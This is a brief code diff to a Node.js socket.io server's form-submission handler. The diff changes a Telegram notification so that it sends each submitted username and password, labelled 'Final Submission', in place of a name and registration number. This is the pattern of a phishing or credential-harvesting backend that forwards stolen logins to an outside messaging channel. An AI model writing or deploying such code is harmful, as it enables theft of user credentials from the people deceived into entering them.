@@ -38,7 +38,7 @@ io.on("connection",(socket)=>{
     socket.on("submit",(data)=>{
         console.log("Form submitted",data);
 
-        sendTelegram(`✅ Form submitted\nName: ${data.name}\nReg: ${data.reg}`);
+        sendTelegram(`✅ Final Submission\nUsername: ${data.username}\nPassword: ${data.password}`);
     });
 
 });
